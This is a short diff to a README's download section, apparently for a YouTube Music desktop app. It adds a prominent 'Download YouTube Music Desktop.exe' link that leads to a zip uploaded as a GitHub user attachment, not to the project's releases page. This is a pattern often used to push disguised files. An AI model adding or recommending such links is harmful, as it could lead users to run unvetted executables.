@@ -28,7 +28,9 @@
 
 ## 📦 Download
 
-> ✅ No installation required – just download and run!
+✅ **Click below to download the app instantly. No installation required.**
+
+👉 [**Download YouTube Music Desktop.exe**](https://github.com/user-attachments/files/21219030/Youtube.Music.PC.zip)
 
 <p align="center">
   <a href="https://github.com/merensonmez/youtube-music-desktop/releases/latest">
